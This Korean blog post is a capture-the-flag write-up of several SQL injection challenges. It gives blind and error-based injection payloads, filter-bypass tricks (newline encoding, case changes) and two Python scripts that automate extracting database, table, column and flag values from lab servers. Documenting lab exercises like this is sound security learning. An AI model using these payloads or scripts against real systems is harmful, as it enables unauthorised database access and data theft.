---
title: "Blind & Error Based SQL Injection"
date: 2025-05-25
excerpt: "Blind SQL Injection 및 Error-based SQL Injection을 활용해 로그인 우회, 세션 처리 방식, 쿼리 취약점을 분석하고 플래그를 획득한 CTF 풀이 기록이다."
layout: single
toc: true
toc_label: "Blind & Error Based SQLI"
toc_icon: "book"
toc_sticky: true
tags: [web, sqli, blind, error based, hacking]
header:
  teaser: /assets/web-screenshots/blind-error-based-sqli/union-sqli.png
  teaser_home_page: true
---

# 개요

이 페이지는 Blind SQL Injection과 Error Based SQL Injection을 활용한 CTF 문제 풀이 기록입니다.

각 문제는 로그인 우회, 세션 처리 방식, 그리고 SQL 쿼리 구조의 취약점을 분석하여 flag를 획득하는 과정을 담고 있습니다.

---

# 문제 풀이 정리

## SQL Injection (Blind SQLI)

![blindsql](/assets/web-screenshots/blind-error-based-sqli/sqli_blind_1.png)

이 문제는 Blind SQL Injection 취약점이 존재하는 CTF 문제이다.

서버는 쿼리 결과에 따라 다음과 같은 메시지를 출력한다
 - 존재하는 ID일 경우 → "**존재하는 아이디입니다.**"
 - 존재하지 않는 ID일 경우 → "**존재하지않는 아이디입니다.**"

우선 SQL 인젝션이 가능한지 확인하기 위해 다음과 같이 테스트를 진행했다.

| 입력값 (`query` 파라미터)      | 응답 메시지          | 의미                  |
| ----------------------- | --------------- | ------------------- |
| `normaltic' and '1'='1` | 존재하는 아이디입니다.    | 조건이 참(True) → 성공 |
| `normaltic' and '1'='2` | 존재하지않는 아이디입니다. | 조건이 거짓(False) → 실패  |

`query=normaltic' and '1'='1`을 입력했을 때는 **"존재하는 아이디입니다."**라는 응답이 나왔고,
`query=normaltic' and '1'='2`를 입력했을 때는 **"존재하지않는 아이디입니다."**라는 응답이 출력되었다.

이를 통해 입력값이 SQL 쿼리에 제대로 반영되고 있으며, **Boolean 기반 Blind SQL Injection이 가능한 상태**임을 확인할 수 있었다.

이제 이를 활용하여 **현재 사용 중인 데이터베이스**를 추출해보겠다.

Blind SQL Injection을 보다 빠르게 수행하기 위해, 이를 자동화하는 **파이썬 스크립트를 작성하여 데이터베이스 정보를 추출**할 예정이다.

```sql
normalti' or ascii(substr(database(),{i},1))={ascii} and '1'='1
```

![blindsql](/assets/web-screenshots/blind-error-based-sqli/python_sqli.png)

위와 같이 페이로드를 구성하여 **Blind SQL Injection 자동화를 위한 파이썬 스크립트**를 작성하였다.

![데이터베이스 추출](/assets/web-screenshots/blind-error-based-sqli/sqli_1_database.png)

스크립트를 실행한 결과, 데이터베이스 이름은 **blindSqli**로 확인되었다.

이제 `information_schema`를 **이용해 테이블명을 추출할 예정**이다.

```sql
' or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {j},1),{i},1))={ascii} and '1'='1
```

위와 같이 파라미터에 들어갈 **파이썬용 Blind SQLi 페이로드**를 구성한 후.

![blindsql](/assets/web-screenshots/blind-error-based-sqli/python_table_sqli1.png)

스크립트를 약간 수정한 뒤, 해당 페이로드로 **테이블 이름을 추출**하였다.

![blindsql](/assets/web-screenshots/blind-error-based-sqli/python_table_sqli1_find.png)

> 테이블 이름: **flagTable**

테이블 이름을 확인했으므로, 이제 `information_schema`를 통해 **컬럼명을 추출**할 차례다.

```sql
' or ascii(substr((select column_name from information_schema.columns where table_name='flagTable' limit {j},1),{i},1))={ascii} and '1'='1
```

![blindsql](/assets/web-screenshots/blind-error-based-sqli/python_sqli1_column.png)

최종 컬럼 추출 결과:
 - **idx**
 - **flag**

이제 마지막으로, **`flag` 컬럼에 저장된 데이터를 추출**할 것이다.

```sql
' or ascii(substr((select flag from flagTable limit {j},1),{i},1))={ascii} and '1'='1
```

![blindsql](/assets/web-screenshots/blind-error-based-sqli/sqli_flag.png)

**이렇게 최종적으로 flag까지 얻어내는 데 성공하였다.**

---

## SQL Injection (Error Based SQLi)

이 문제는 Error Based SQLi Injection 취약점이 존재하는 CTF 문제이다. 

서버는 쿼리 결과에 따라 **"존재하는 아이디입니다."** 또는 **"존재하지않는 아이디입니다."**라는 응답 메시지를 출력한다.

이전과 동일하게 SQL 인젝션이 가능한지 확인하기 위해 다음과 같이 테스트를 진행하였다.

마찬가지로 `query=normaltic' and '1'='1`을 입력했을 때는 **"존재하는 아이디입니다."**라는 응답이 나왔고,
`query=normaltic' and '1'='2`를 입력했을 때는 **"존재하지않는 아이디입니다."**라는 응답이 출력되었다.

이를 바탕으로, 이번에는 **Error Based SQL Injection 공격**을 시도해볼 것이다.

```sql
' or extractvalue(1,concat(0x7e,database())) and '1'='1
```

위의 페이로드를 삽입하여 공격한 결과,

![에러 데이터베이스](/assets/web-screenshots/blind-error-based-sqli/sqli2_database.png)

**데이터베이스 이름이 에러 메시지를 통해 노출되었다.**

> 데이터베이스 이름: **errSqli**

이 데이터베이스 이름을 기반으로, **테이블 → 컬럼 → 플래그 값**까지 순차적으로 추출할 것이다.

```sql
' or extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='errSqli' limit 0,1))) and '1'='1
```

> 테이블 이름: **flagTable**

```sql
' or extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='errSqli' and table_name='flagTable' limit 1,1))) and '1'='1
```

> 컬럼 이름: **idx**, **flag**

**flag 컬럼 데이터 추출**
```sql
' or extractvalue(1,concat(0x7e,(select flag from flagTable limit 0,1)))+and+'1'='1
```

![error flag](/assets/web-screenshots/blind-error-based-sqli/sqli2_flag.png)

**최종적으로 flag까지 얻어내는 데 성공하였다.**

---

## SQL Injection 3 (Error Based SQLI)

![sqli3 home](/assets/web-screenshots/blind-error-based-sqli/sqli3_home.png)

이번 문제는 로그인 화면에서 시작된다.
우선, 문제에서 제공된 계정 정보를 이용해 로그인을 시도해보았다.

- 계정: normaltic / 1234

![sqli3 login](/assets/web-screenshots/blind-error-based-sqli/sqli3_login.png)

로그인에 성공하면 서버는 `302 Found` 응답과 함께 `index.php`로 리다이렉션시킨다.
이를 통해 로그인 로직이 정상 동작함을 확인했으며, 이제 이를 바탕으로 SQL Injection 테스트를 진행해볼 것이다.

| 입력값 (`UserId` 파라미터)      | HTTP 응답           | 의미                 |
| ----------------------- | ----------------- | ------------------ |
| `normaltic' and '1'='1` | 302 Found (리다이렉션) | 조건이 참(True) → 성공   |
| `normaltic' and '1'='2` | 200 OK            | 조건이 거짓(False) → 실패 |


실행 결과, `UserId=normaltic' and '1'='1`을 입력했을 때는 **302 리다이렉션**이 발생하고,
`UserId=normaltic' and '1'='2`를 입력했을 때는 **200 OK 응답**이 반환되었다.

이제 이 결과를 바탕으로, **Error Based SQL Injection 공격**을 시도해볼 것이다.

```sql
' or extractvalue(1,concat(0x7e,(select+database()))) and '1'='1
```

**실행 결과:**

![sqli3 database](/assets/web-screenshots/blind-error-based-sqli/sqli3_database.png)

**Error Based SQL Injection을 통해 데이터베이스 이름(`sqli_2`)을 성공적으로 추출**할 수 있었다.

이제 이 정보를 바탕으로, **해당 데이터베이스 내의 테이블, 컬럼, 그리고 최종 데이터까지** 순차적으로 추출할 것이다.

```sql
' or extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='sqli_2' limit 0,1))) and '1'='1
```

> 테이블 이름: **flag_table**

테이블 이름까지 성공적으로 추출하였다. 이제 해당 테이블에서 컬럼명을 추출해보겠다.

```sql
' or extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='sqli_2' and table_name='flag_table' limit 0,1))) and '1'='1
```

> 컬럼 이름: **flag**

이제 마지막으로, 이 컬럼에 저장된 **flag 값**을 추출해보겠다.

```sql
' or extractvalue(1,concat(0x7e,(select flag from flag_table limit 0,1))) and '1'='1
```

![sqli3 flag](/assets/web-screenshots/blind-error-based-sqli/sqli3_flag.png)

**이렇게 해서 최종적으로 flag 값을 성공적으로 획득하였다.**

---

## SQL Injection 4 (Error Based SQLI)

이번 문제 이전과 동일한 로그인 화면으로 시작된다.

- 계정: normaltic / 1234

똑같이 문제에서 준 아이디/비번으로 로그인을 시도하니 로그인에 성공할 경우에는 `302 리다이렉션`, 실패할 경우에는 `200 OK 응답`이 반환된다.

이를 통해 **로그인 여부를 HTTP 응답 코드로 판별할 수 있음**을 알 수 있다.

우선, SQL 인젝션이 가능한지 확인하기 위해 간단한 테스트를 진행하였다.

아까와 똑같이 `normaltic' and '1'='1`을 입력했을 때는 **302 리다이렉션**이 발생하고,
`normaltic' and '1'='2`를 입력했을 때는 **200 OK 응답**이 반환되었다.

이번에도 **Error Based SQL Injection** 기법을 사용하여 공격을 시도할 것이다.

```sql
' or extractvalue(1,concat(0x7e,database())) and '1'='1
```

**실행 결과:**

![sqli4 database](/assets/web-screenshots/blind-error-based-sqli/sqli4_database.png)

> 데이터베이스 이름: **sqli_2_1**

이제 데이터베이스 이름을 바탕으로, **테이블명부터 컬럼, 최종 데이터**까지 차례로 추출해볼 것이다.

```sql
' or extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='sqli_2_1' limit 0,1))) and '1'='1
```

> 테이블 이름: **flag_table**

이어서, 해당 테이블의 컬럼 정보도 순차적으로 추출해보자.

```sql
' or extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='sqli_2_1' and table_name='flag_table' limit ?,1))) and '1'='1
```

컬럼을 추출해본 결과, 테이블에는 `flag1`, `flag2`, `...`, `flag8`과 같은 이름의 컬럼들이 존재하였다.

이제 각 컬럼을 하나씩 조회하여, **실제 데이터 값을 추출**해보겠다.

```sql
' or extractvalue(1,concat(0x7e,(select flag1 from flag_table limit 0,1))) and '1'='1
```

위 페이로드를 활용하여 `flag1`부터 `flag8`까지의 컬럼 값을 순차적으로 조회하였다.
그 결과, **각 컬럼에 저장된 값들을 조합하여 최종 플래그를 완성**할 수 있었다.

---

## SQL Injection 5 (Error Based SQLI)

이번 문제 역시 이전과 동일한 로그인 화면으로 시작된다.

- 계정: normaltic / 1234

로그인에 성공할 경우에는 `302 리다이렉션`, 실패할 경우에는 `200 OK 응답`이 반환된다.

이를 기반으로, SQL 인젝션이 가능한지 테스트를 진행해보겠다.

```sql
normaltic' and '1'='1
normaltic' and '1'='2
```

**아까와 똑같다.**

이를 기반으로, **Error Based SQL Injection 공격**을 진행해보겠다.

```sql
' or extractvalue(1,concat(0x7e,database())) and '1'='1
```

**실행 결과:**

![sqli4 database](/assets/web-screenshots/blind-error-based-sqli/sqli4_database.png)

> 데이터 베이스 이름: **sqli_2_2**

이를 이용하여 **테이블명과 컬럼명, 그리고 최종 데이터**까지 추출해보겠다.

```html
' or extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='sqli_2_2' limit 0,1))) and '1'='1
```

> 테이블 이름: **flagTable_this**

**컬럼명 추출:**

```sql
' or extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='sqli_2_2' and table_name='flagTable_this' limit 1,1))) and '1'='1
```

> 컬럼 이름: **idx**, **flag**

이제 최종 flag 데이터를 추출해보겠다.

```sql
' or extractvalue(1,concat(0x7e,(select flag from flagTable_this limit 13,1))) and '1'='1
```

![sqli5 flag](/assets/web-screenshots/blind-error-based-sqli/sqli5_flag.png)

**이렇게 최종 flag를 획득하였다.**

---

## SQL Injection 6 (Blind SQLI)

이번 문제 역시 이전과 동일한 로그인 화면으로 시작된다.

- 계정: normaltic / 1234

로그인에 성공할 경우에는 `302 리다이렉션`, 실패할 경우에는 `200 OK 응답`이 반환된다.

이를 기반으로, SQL 인젝션이 가능한지 테스트를 진행해보겠다.

아까와 똑같이 `normaltic' and '1'='1`을 입력했을 때는 **302 리다이렉션**이 발생하고,
`normaltic' and '1'='2`를 입력했을 때는 **200 OK 응답**이 반환되었다.

하지만 이번에는 **Error Based SQL Injection** 기법을 시도했으나, **서버 측 필터링 또는 예외 처리로 인해 동작하지 않았다.**

따라서 이번에는 **Blind SQL Injection** 방식으로 공격을 진행해보겠다

```sql
normaltic' or ascii(substring(database(),1,1))=115 and '1'='1
```

위 페이로드를 실행한 결과, **조건이 참일 경우 `200 OK`**, 거짓일 경우 `302 리다이렉션` 응답이 발생하였다.
이를 기반으로, **Blind SQL Injection 자동화를 위한 파이썬 스크립트**를 작성해보겠다.

```python
import requests

def data(sql):
    result = ""
    for i in range(1, 50):
        for ascii_code in range(32, 127):
            payload = f"normaltic' or ascii(substr(({sql}),{i},1))={ascii_code} and '1'='1"
            data = {"UserId": payload, "Password": "1234", "Submit": "Login"}
            r = requests.post("http://ctf2.segfaulthub.com:7777/sqli_3/login.php", data=data, allow_redirects=False)
            if r.status_code == 200:
                result += chr(ascii_code)
                print(chr(ascii_code), end='')
                break
        else:
            break
    return result

print("DB: ")
db = data("database()")
print("\n")
print("Table: ")
table = data(f"select table_name from information_schema.tables where table_schema='{db}' limit 0,1")
print("\n")
print("Column:")
col = data(f"select column_name from information_schema.columns where table_name='{table}' limit 0,1")
print("\n")
print("Flag:")
flag = data(f"select {col} from {table} limit 0,1")
print("\n")
print(f"Flag → {flag}")
```

이를 활용하여 데이터베이스 이름부터 테이블, 컬럼, 최종 데이터까지 **순차적으로 자동 추출하는 Python 스크립트**를 작성하였다.

![sqli6 flag](/assets/web-screenshots/blind-error-based-sqli/sqli6_flag.png)

**이렇게 flag까지 성공적으로 추출할 수 있었다.**

---


## 테마 고르기 (Error Based SQLI)

![theme board](/assets/web-screenshots/blind-error-based-sqli/theme_board.png)

이번 문제는 사용자가 직접 테마를 선택하여 **UI 색상 조합을 적용해보는 테마 커스터마이저 기능**으로 구성되어 있었고, 페이지에서는 Dark, Light, Neon, Minimal, Cyber와 같은 프리셋 버튼을 제공하며 선택된 테마는 실시간으로 "Theme Preview" 영역에 적용되고, 아래에는 **JSON 형식의 현재 설정 값**이 표시되도록 구성되어 있다.

![theme cookie](/assets/web-screenshots/blind-error-based-sqli/theme_cookie.png)

Burp Suite로 `/spec4/theme.php` 요청을 확인한 결과,
클라이언트가 보낸 `Cookie` 헤더 내의 `user_theme=neon` 값이 서버에서 그대로 파싱되어,
응답 본문 내 `theme_name` 및 `theme_settings` 필드에 **JSON 형식**으로 삽입되고 있었다.

이를 기반으로 **쿠키에 포함된 `user_theme` 파라미터를 이용해 SQL Injection 가능성을 테스트**해보았다.

`user_theme` 쿠키 값을 조작하여 SQL Injection을 시도하던 중,
**일반적인 공백 문자 (`%20`)는 필터링되거나 무시되고**, `--`, `#` 등 주석 구문도 차단되고 있는 것을 확인하였다.
그러나 개행 문자 (%0a) 는 필터링되지 않고 그대로 처리되었으며, 이를 이용해 다음과 같은 페이로드로 SQL Injection에 성공하였다.

```html
neon'%0aand%0a'1'='1
```

이 결과를 통해 **공백 및 주석 필터링을 우회하는 기법으로 `%0a` 기반의 인젝션이 유효함**을 확인할 수 있었다.

이번에는 **에러 메시지를 이용한 SQL Injection 기법**으로 접근을 시도하였다.

> 데이터베이스 이름 추출
```html
neon'%0aor%0aextractvalue(1,concat(0x7e,database()))%0aand%0a'1'='1
```

![에러 기반 sql](/assets/web-screenshots/blind-error-based-sqli/spec4_database.png)

> 데이터베이스 이름 **spec4**

이후 테이블 이름을 추출하기 위해 `information_schema.tables`를 대상으로 쿼리를 시도하였다.
하지만 소문자 `select` 키워드에 필터링이 적용되어 있어, **대문자 `SELECT`를 사용하여 우회**하였다. 

```html
neon'%0aor%0aextractvalue(1,concat(0x7e,(SELECT%0atable_name%0afrom%0ainformation_schema.tables%0awhere%0atable_schema='spec4'%0alimit%0a0,1)))%0aand%0a'1'='1
```

쿼리 실행 결과, 테이블 이름으로 **flags**가 출력되었고, 이후 이 테이블을 대상으로 컬럼 및 데이터를 조회할 수 있었다.

이제 이어서 컬럼 이름과 테이블 내 데이터를 순차적으로 추출해볼 예정이다, 
우선 `information_schema.columns`를 사용하여 `flags` 테이블의 컬럼명을 확인하기 위해 다음과 같은 쿼리를 입력하였다.

```html
neon'%0aor%0aextractvalue(1,concat(0x7e,(SELECT%0acolumn_name%0afrom%0ainformation_schema.columns%0awhere%0atable_schema='spec4'%0aand%0atable_name='flags'%0alimit%0a0,1)))%0aand%0a'1'='1
```

`information_schema.columns`를 활용한 쿼리 결과,
`flags` 테이블에는 `flag_id`, `flag`, `description`, `created_at` 컬럼이 존재함을 확인하였다.

최종적으로 다음과 같은 **에러 기반 SQL Injection 페이로드**를 이용하여 flag 값을 추출하였다.

```html
neon'%0aor%0aextractvalue(1,concat(0x7e,(SELECT%0aflag%0afrom%0aflags%0alimit%0a0,1)))%0aand%0a'1'='1
```

![spec4 flag](/assets/web-screenshots/blind-error-based-sqli/spec4_flag.png)

플래그를 추출하는 과정에서 응답 길이 제한으로 인해 일부 값이 잘려 출력되는 문제가 발생하였다. 이를 해결하기 위해, 아래와 같은 쿼리를 사용하여 flag 값의 뒷부분을 `substring()` 함수를 통해 분할 추출하였다.

```html
neon'%0aor%0aextractvalue(1,concat(0x7e,(SELECT%0asubstring(flag,31,32)%0afrom%0aspec4.flags%0alimit%0a0,1)))%0aand%0a'1'='1
```

**이렇게 최종 flag를 얻었다.**

---

## 보안 커뮤니티 (Blind SQLI)


![보안 커뮤니티 board](/assets/web-screenshots/blind-error-based-sqli/spec5.png)

해당 페이지는 보안 관련 커뮤니티 게시판으로 보이며, 상단에는 게시글을 검색할 수 있는 **Search 입력창**이 존재한다.

전반적인 UI 구성과 문제의 흐름상, 검색 기능을 통해 **SQL Injection 공격을 시도해보는 것이 의도된 것으로 판단**된다.

우선 Burp Suite를 활용하여 **검색 요청 시 전달되는 파라미터를 분석**해보았다.

![보안 커뮤니티 parameter](/assets/web-screenshots/blind-error-based-sqli/spec5_parameter.png)

검색 파라미터로 `q=sql`, `q=ql` 등을 넣었을 때 동일한 결과가 출력되는 것으로 보아,
내부적으로 **SQL의 `LIKE` 문을 사용한 검색 로직**이 적용되어 있는 것으로 추정된다.

`LIKE` 문을 활용한 SQL Injection을 시도한 결과, 다음과 같은 페이로드를 통해 게시물이 정상적으로 출력되었다.

```html
ql%' Or '1%'='1
```

이를 통해 **검색 기능에 SQL Injection이 가능한 상태임을 확인하였고,
`or` 키워드는 필터링되고 있었지만, 대소문자를 구분하지 않는 SQL 문법의 특성을 이용해 `Or`로 우회**할 수 있었다.

우선 `Boolean-Based Blind SQL Injection` 쿼리를 구성해 실행해보았다.

```html
33333%' Or if(ascii(substring((select+database()),1,1))=115,1,0) and '1%'='1
```

**Content-Length의 응답 패턴**
    - 조건이 참일 경우: **Content-Length: 2296**
    - 조건이 거짓일 경우: **Content-Length: 16**

응답의 **`Content-Length`가 16일 경우를 거짓 조건의 기준으로 판단**하고,
이를 활용한 `Boolean-Based Blind SQL Injection`을 통해 자동화를 작성하여 한 글자씩 추출해 볼 것이다.

![파이썬 활용 데이터베이스 추출](/assets/web-screenshots/blind-error-based-sqli/python_database.png)

이 파이썬 코드로 추출을 진행 하였다.

```python
import requests

result_data = []

for j in range(0, 5):
    result = ""
    print(f"Row: {j + 1}")

    for i in range(1, 30):
        found = False
        for ascii in range(32, 127):
            payload = (f"33333%' Or if(ascii(substr((select flag from flags limit {j},1),{i},1))={ascii},1,0) and '1%'='1")
            r = requests.get("http://ctf.segfaulthub.com:2984/spec5/search.php", params={"q": payload})

            if len(r.text) > 1000: 
                result += chr(ascii) 
                print(f"[{i}] {chr(ascii)} → Current Progress: {result}")
                found = True
                break

        if not found:
            print("End")
            break

    result_data.append(result)

for idx, name in enumerate(result_data, 1):
    print(f"{idx}. {name}")
```

![파이썬 활용 데이터베이스 추출 완료](/assets/web-screenshots/blind-error-based-sqli/python_database_success.png)

> 데이터베이스 이름 **spec5**

추출한 데이터베이스 이름을 기반으로, `information_schema.tables`를 이용해 내부 테이블 목록을 확인해볼 것 이다.

```html
33333%' Or if(ascii(substr((select table_name from infOrmation_schema.tables where table_schema='spec5' limit {j},1),{i},1))={ascii},1,0) and '1%'='1"
```

![파이썬 활용 테이블 추출](/assets/web-screenshots/blind-error-based-sqli/python_table.png)

위와 같은 방식으로 파이썬 코드를 약간 수정하여, 테이블 목록을 추출하는 스크립트를 작성하였다.

![파이썬 활용 테이블 추출 완료](/assets/web-screenshots/blind-error-based-sqli/python_table_success.png)

확인된 테이블 이름:
  - comments
  - flags
  - posts

이제 `flags` 테이블의 컬럼을 확인하기 위해, `information_schema.columns`를 활용한 스크립트를 작성할 것이다.

```html
33333%' Or if(ascii(substr((select column_name from infOrmation_schema.columns where table_schema='spec5' and table_name='flags' limit {j},1),{i},1))={ascii},1,0) and '1%'='1
```

![파이썬 활용 컬럼 추출 완료](/assets/web-screenshots/blind-error-based-sqli/python_column_success.png)

확인된 테이블 이름:
 - comments
 - flags
 - description
 - created_at

이제 마지막 단계로, `flags` 테이블의 컬럼에서 실제 데이터를 추출해보았다.

```html
33333%' Or if(ascii(substr((select flag from flags limit {j},1),{i},1))={ascii},1,0) and '1%'='1
```

![파이썬 활용 플래그 추출 완료](/assets/web-screenshots/blind-error-based-sqli/spec5_flag.png)

**이렇게 마지막 문제까지 모두 마무리 했다.**

